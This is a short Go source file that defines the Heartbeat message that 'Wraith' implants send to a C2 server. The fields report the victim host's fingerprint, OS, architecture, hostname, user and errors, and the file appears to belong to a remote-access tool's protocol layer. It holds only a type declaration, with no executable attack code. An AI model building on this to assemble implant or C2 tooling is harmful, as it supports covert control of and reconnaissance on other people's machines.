package proto

// The structure of heartbeats which Wraiths send to c2 to register
// their status and presence.
type Heartbeat struct {
	// The unique fingerprint of the Wraith.
	Fingerprint string

	// The operating system Wraith is running on.
	HostOS string

	// The CPU architecture of the host.
	HostArch string

	// The system hostname.
	Hostname string

	// The name of the user under which Wraith is running.
	HostUser string

	// The ID of the user under which Wraith is running.
	HostUserId string

	// A list of errors the Wraith has encountered.
	Errors []error
}
